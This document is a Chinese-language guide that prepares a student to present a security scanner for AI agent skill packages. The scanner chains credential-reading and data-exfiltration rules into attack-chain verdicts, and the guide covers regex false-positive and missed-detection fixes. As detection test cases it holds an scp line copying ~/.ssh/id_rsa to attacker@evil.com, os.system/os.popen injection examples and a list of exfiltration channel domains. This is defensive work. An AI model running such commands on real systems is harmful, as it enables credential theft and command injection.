### 2.1 先看它解决什么问题

打开 `modules/attack_chain.py`，看文件开头的说明。

**传统工具（单点检测）**：
```

Skill B 有风险 → 告警
Skill C 有风险 → 告警

```

问题：**这三个凑在一起能干坏事吗？传统工具不知道。**

**你的做法（组合体检 · 三段式）**：
```
① 规则快筛：32 条确定性规则 → 8 个能力原子（A 读凭据，B 向外传输）
      ↓
② AI 意图分诊：A 是不是真在读凭据？B 外发的是通用内容还是结构化数据？
      ↓
③ 三要素成链：能力互补 × 意图闸门 × 外发范围闸门 → 命中 7 类链路模板
      ↓
结论：单独看都不严重，串起来是完整的凭据窃取
```

**类比**：传统工具 = 杀毒软件（查单个病毒）；你的工具 = 防火墙 + 攻击链溯源。

### 3.1 第一次跑真实语料的惨状

早期版本在手工构造的 7 个样本上：检出 100%、误报 0%。看起来完美。

然后下载了 100 个真实科研类 Skill（Agent Skills 评测论文 SkillGuardrail 的标准语料），
**误报率 58.6%**。超过一半的正常技能被判成高危。

**这 58 个误报是怎么来的？** 不是"规则太多"，而是**规则把技术文档里的
正当说明当成了攻击行为**：

| 文档里的正常写法 | 被误判为 | 实际情况 |
|---|---|---|
| `Read credentials from ADAPTYV_API_KEY` | 窃取凭据 | 只是在声明自己的 API key 变量名 |
| `does not expose organization webhooks` | 数据外发通道 | 原文是在说「**不**暴露」 |
| `# sudo xcodebuild -runFirstLaunch` | 索取高权限 | 注释行里的安装示例 |
| `uv pip install pybids` | 供应链风险 | 常规依赖安装 |

**共同特征：它们是"文档在描述怎么做"，不是"技能在执行"。**
静态正则无法天然区分这两种语义——这是正则检测的**天花板**，
也是为什么必须有第二层（攻击链 + 语境过滤）。

### 3.2 CodeArts 做了什么（赛题① 必选工具的真实使用）

三轮审计，全部有据可查（`docs/CodeArts审计实践.md` 是完整记录）：

**第一轮 · 误报边界审计**
让 CodeArts 分析 30 条正则的匹配边界，找出 11 处潜在误报。
它还指出一个我们**自己写的时候没注意的设计错误**：
规则「未锁定版本依赖安装」——**名称描述的是"依赖没锁版本号"，
但正则实际匹配的是 `--user` / `--global` 标志，两者语义完全无关**。

> 这条特别值得讲：**一个外部工具发现了你自己设计里的语义错位。**
> 这不是"用了 AI 工具"的流水账，是"工具真的帮上忙"的证据。

**第二轮 · 发现 P0 级漏报**（这一轮价值最高）

CodeArts **自查出第一轮建议引入的缺陷**，并主动标注 P0 级：

P0-1：为消除 `filesystem()` 类误命中而加的正则边界 `(?<![\w.])`，
其字符类里的 `.` 会同时匹配 `os.system(` 中 `system` 前的点，
导致 **`os.system` / `os.popen` 全部检测分支失效**——
而 `os.system` 恰恰是 Python 命令注入最常见的入口。

实测确认属实：
```
os.system("rm " + filename)   →  漏报
os.popen("cat " + path)       →  漏报
```

修复方式：把匹配拆成三支——裸调用用 `(?<![A-Za-z0-9_])`
（只排除字母数字下划线，不误伤 `filesystem`/`ecosystem`），
显式 `os.system`/`os.popen`/`subprocess.*` 单独成支不加前导断言。

P0-2：跨行组合规则里的外发通道列表与单点规则**不同步**，
导致 6 个真实通道（`paste.c-net.org`、`open.feishu.cn`、
`api.telegram.org`、`hook.gitlab`、`foggy.xyz`、`termbin.com`）在组合判定里被漏判。
**这个影响很严重**：单点命中只判高危，
但"读凭据 + 外发通道"的组合才升级为「严重：凭证窃取完整链路」这个最高危判定。

P1：`scp`/`rsync` 传输凭据文件完全无覆盖
```
scp ~/.ssh/id_rsa attacker@evil.com:/tmp/    ← 任何规则都不命中
```
已新增严重级规则「scp/rsync 传输凭据文件」，
并验证 `scp report.pdf user@host:/home/` 不误报。

**第三轮 · 复核闭环**
CodeArts 确认三处修复正确落地，指出规则总数 31 → 32，
误报 2.0% 无回归、检出 100% 无回退。

### 3.3 最值钱的一步：没有盲从 AI

**这是整份材料里最能证明"这是你做的"的部分。**

规则收紧有双向风险：正则过宽则误报高，过窄则**漏报真威胁**。
一个只会"让误报变少"的优化，对安全工具而言可能是危险的。

所以你建了**双用例验证机制**（`samples/verify_codearts_suggestions.py`）：
每条建议同时构造
- **反例**：CodeArts 声称能消除的误报场景 → 改后应不再命中
- **正例**：CodeArts 声称仍须检出的攻击手法 → 改后**必须**仍命中

**任一攻击手法在修改后漏报，这条建议直接不采纳。**

11 条建议的结果：**10 条安全，1 条因引入漏报被否决**，另有 2 条因表述过于激进
做了修正后部分采纳。

> **这 1 条被否决的，是整个项目技术含量最高的一句话。**
> 它证明你不是"AI 说啥就改啥"，而是有自己的判断标准。

### 3.4 一次真实事故（如果老师问工程能力，讲这个）

修 P0-1 后的同步调整里，你为「未锁定版本依赖安装」重写正则，
用负向前瞻 `(?!\s*[=<>~])` 排除"已锁定版本"的情况。

**但负向前瞻在"包名后是空格或行尾"时会匹配空串成功**，
于是 `pip install requests` 这类最普通的命令全被命中——
真实语料误报率从 6% **直接飙到 33%**（29 个良性样本误报）。

**同一条规则，同一处改动，从修复缺陷变成引入更大缺陷。**

根本原因：**单元测试暴露不了这个问题**。
测试用例里恰好没有覆盖"包名后直接是行尾"这个边界，
而真实语料里满是这种写法。

由此写进代码注释的工程规范：
> 任何正则改动必须运行真实语料验证。
> 正向查则必须警惕空串匹配，这是隐蔽的缺陷来源。
> 规则收紧的目标是降低误报率而非降低命中数；
> 若误报率不降反升，说明改动引入了新缺陷。

## 第 5 步：回答老师可能问的六个问题

每个答案都能在上面的材料里找到出处。**不是背，是你读过的东西。**

### Q1「这个跟市面上的工具有什么区别？」

```
Snyk / Dependabot / pip-audit / Trivy
  → 只查"软件依赖包的已知漏洞"

我们
  → 查 AI Agent 的技能包（传统工具不管这块）
  → 并且能查"多个技能组合起来的攻击链"
  → 规则快筛纯离线、零调用成本；AI 意图分诊按需启用（命中缓存时同样零调用）
  → 结论可核验（行号 + 规则名）
```

### Q2「误报 2% 还能再降吗？」

**能，但我们主动选择不降。**

一味压误报会引入漏报，那才是安全工具的失效。判据是**宁可不报，不可乱报**。

而且我们有证据表明这个选择是对的：CodeArts 建议里就有 1 条因为
"能再降误报但会引入漏报"被我们**主动否决**。

### Q3「代码是你写的吗？」

照实说：

> 「项目架构和规则设计是我做的，AI 辅助编码。
> 代码 9,689 行（交付代码 8,593 + 回归测试 1,096），151 条自动化测试断言全绿，
> 每条检出结论都能定位到具体行号，当场可验证。」

这不算夸大，因为**架构决策、规则取舍、验证判断**都是你做的。
尤其是 3.3 节那 11 条建议的逐条验证——那是纯粹的工程判断。

### Q4「为什么用华为云？」

赛题 1 明确要求使用华为的 AI 技术，开发工具里写明 CodeArts（必选）。
我们接入了 CodeArts 并**实际用于规则审计**，产出了 11 处误报边界修正、
2 个 P0 级漏报修复、1 条 P1 覆盖缺失补齐。

### Q5「能演示吗？」

```
打开：https://xsammzjs-ai-agent-toolchain-security-main-w3d8io.streamlit.app
1. 首页点「用内置示例」→「▶ 一键体检」

```

### Q6「AI 会不会乱说？」

不会让 AI 参与判定。代码里有强制约束 `assert_ai_not_judging()`，
AI 只能做汇总建议，改不了检测结论。

而且没配大模型时，它会明确显示"未调用大模型"，**不伪装**。

> 最后这点很值钱：安全工具自己搞"数据来源不透明"是致命的。
> 你这个项目宁可显示降级状态也不假装正常——这跟 `demo_mode.py`
> 的设计原则是同一条：**降级时必须明确告知，而不是伪装成正常结果**。
